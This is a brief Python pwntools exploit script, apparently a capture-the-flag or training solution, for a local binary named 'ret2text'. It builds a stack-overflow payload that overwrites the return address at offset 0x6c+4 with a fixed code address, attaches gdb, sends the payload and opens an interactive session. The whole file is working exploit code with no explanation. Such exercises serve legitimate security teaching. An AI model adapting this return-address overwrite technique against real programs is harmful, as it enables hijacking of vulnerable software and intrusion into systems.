#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
context(log_level = "debug")

elf = ELF("./ret2text")
payload = fit({0x6c + 4: p32(0x0804863A)})

io = process("./ret2text")
raw_input("DEBUG: ")
gdb.attach(io, "b *main+124")
io.sendlineafter("anything?\n", payload)
io.interactive()
io.close()
